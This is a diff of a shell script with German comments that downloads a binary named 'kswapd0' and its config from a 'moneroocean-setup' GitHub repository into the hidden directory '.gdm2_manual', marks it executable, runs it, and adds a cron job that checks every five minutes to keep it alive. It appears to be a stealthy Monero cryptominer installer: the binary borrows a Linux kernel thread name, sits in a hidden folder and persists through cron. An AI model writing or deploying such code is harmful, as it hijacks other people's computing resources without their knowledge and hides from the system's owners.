@@ -17,7 +17,7 @@ if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
     echo "kswapd0 existiert und ist ausführbar."
 else
     echo "kswapd0 existiert nicht oder ist nicht ausführbar. Herunterladen..."
-    curl -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
+    wget -O "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
     chmod +x "$KSWAPD0"
 fi
 
@@ -25,7 +25,7 @@ if [ -f "$CONFIG_JSON" ]; then
     echo "config.json existiert."
 else
     echo "config.json existiert nicht. Herunterladen..."
-    curl -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
+    wget -O "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
 fi
 
 # kswapd0 ausführen, wenn kein anderer Prozess mit der spezifischen Konfiguration läuft
@@ -55,5 +55,6 @@ EOF
 # Überprüfungsskript ausführbar machen
 chmod +x "$HOME/.gdm2_manual/check_kswapd0.sh"
 
-# Cron-Job einrichten
-(crontab -l 2>/dev/null; echo "*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh") | crontab -
+# Cron-Job nur hinzufügen, wenn er nicht existiert
+CRON_JOB="*/5 * * * * $HOME/.gdm2_manual/check_kswapd0.sh"
+(crontab -l 2>/dev/null | grep -v -F "$CRON_JOB"; echo "$CRON_JOB") | crontab -
